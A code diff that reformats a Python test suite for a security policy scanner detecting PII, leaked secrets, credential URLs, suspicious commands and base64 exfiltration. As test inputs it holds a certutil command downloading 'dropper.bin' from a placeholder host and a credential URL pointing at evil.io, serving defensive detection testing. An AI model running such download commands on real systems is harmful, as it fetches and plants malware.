@@ -22,7 +22,9 @@ class DummySettings:
     allow_explain_only_bypass: bool = False
 
 
-def build_policy(rules: list[PolicyRule], allowlist: list[AllowlistEntry] | None = None) -> PolicyDefinition:
+def build_policy(
+    rules: list[PolicyRule], allowlist: list[AllowlistEntry] | None = None
+) -> PolicyDefinition:
     return PolicyDefinition(
         policy_id="default",
         tiers="medium",
@@ -47,7 +49,9 @@ def test_pii_allowlist_skips_known_value() -> None:
     allowlist = [
         AllowlistEntry(regex=re.compile("(?i)whitelisted@example.com"), rule_types={"pii"})
     ]
-    policy = build_policy([PolicyRule(id="PII-EMAIL", type="pii", action="mask", kind="email")], allowlist)
+    policy = build_policy(
+        [PolicyRule(id="PII-EMAIL", type="pii", action="mask", kind="email")], allowlist
+    )
 
     findings = pii.scan("Reach whitelisted@example.com", policy=policy)
 
@@ -55,7 +59,9 @@ def test_pii_allowlist_skips_known_value() -> None:
 
 
 def test_secret_detector_flags_aws_access_key() -> None:
-    policy = build_policy([PolicyRule(id="SECRET-AWS", type="secret", action="block", kind="aws_access_key")])
+    policy = build_policy(
+        [PolicyRule(id="SECRET-AWS", type="secret", action="block", kind="aws_access_key")]
+    )
 
     findings = secrets.scan("Key AKIA1234567890ABCD12 is sensitive.", policy=policy)
 
@@ -113,7 +119,9 @@ def test_pii_pan_detection_blocks_card() -> None:
 
 
 def test_pii_phone_tr_pattern_matches() -> None:
-    policy = build_policy([PolicyRule(id="PII-PHONE-TR", type="pii", action="mask", kind="phone_tr")])
+    policy = build_policy(
+        [PolicyRule(id="PII-PHONE-TR", type="pii", action="mask", kind="phone_tr")]
+    )
 
     findings = pii.scan("Arayın +90 532 000 11 22 hemen.", policy=policy)
 
@@ -121,15 +129,21 @@ def test_pii_phone_tr_pattern_matches() -> None:
 
 
 def test_secret_detector_pem_blocks_entire_blob() -> None:
-    policy = build_policy([PolicyRule(id="SECRET-PEM", type="secret", action="block", kind="pem_private_key")])
+    policy = build_policy(
+        [PolicyRule(id="SECRET-PEM", type="secret", action="block", kind="pem_private_key")]
+    )
 
-    findings = secrets.scan("-----BEGIN PRIVATE KEY-----\nABC\n-----END PRIVATE KEY-----", policy=policy)
+    findings = secrets.scan(
+        "-----BEGIN PRIVATE KEY-----\nABC\n-----END PRIVATE KEY-----", policy=policy
+    )
 
     assert findings and findings[0].detail["masked"] == "[pem-private-key]"
 
 
 def test_url_detector_handles_credential_urls() -> None:
-    policy = build_policy([PolicyRule(id="URL-CRED", type="url", action="block", kind="cred_in_url")])
+    policy = build_policy(
+        [PolicyRule(id="URL-CRED", type="url", action="block", kind="cred_in_url")]
+    )
 
     findings = url.scan("https://user:pass@evil.io/download", policy=policy)
 
@@ -137,15 +151,21 @@ def test_url_detector_handles_credential_urls() -> None:
 
 
 def test_cmd_detector_matches_certutil() -> None:
-    policy = build_policy([PolicyRule(id="CMD-CERTUTIL", type="cmd", action="block", kind="certutil")])
+    policy = build_policy(
+        [PolicyRule(id="CMD-CERTUTIL", type="cmd", action="block", kind="certutil")]
+    )
 
-    findings = cmd.scan("certutil.exe -urlcache -f http://bad/dropper.bin dropper.bin", policy=policy)
+    findings = cmd.scan(
+        "certutil.exe -urlcache -f http://bad/dropper.bin dropper.bin", policy=policy
+    )
 
     assert findings and findings[0].detail["reason"] == "certutil"
 
 
 def test_exfil_detector_flags_large_base64() -> None:
-    policy = build_policy([PolicyRule(id="EXFIL-B64", type="exfil", action="block", kind="large_base64")])
+    policy = build_policy(
+        [PolicyRule(id="EXFIL-B64", type="exfil", action="block", kind="large_base64")]
+    )
     payload = ("A" * 900) + "=="
 
     findings = exfil.scan(payload, policy=policy)
